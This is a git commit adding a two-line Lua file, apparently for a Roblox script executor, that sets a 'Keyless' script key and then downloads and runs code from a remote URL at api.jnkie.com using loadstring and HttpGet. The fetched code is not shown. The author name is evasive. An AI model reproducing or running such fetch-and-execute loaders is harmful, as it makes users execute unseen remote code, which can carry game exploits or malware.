8206467ee26f0135f324e951c62500de6fb4b5eb
idkjustarandomdudeherenothingtosee <promcpegamer99@gmail.com>
2026-02-20 21:29:57 +0300

    Add testversion.lua for script loading

---
+++ src/testversion.lua
@@ -0,0 +1,2 @@
+getgenv().SCRIPT_KEY = "Keyless"
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/76a77637086593e4ec9e49f41003103b6e793f93c7648244b197066d358c31ed/download"))()
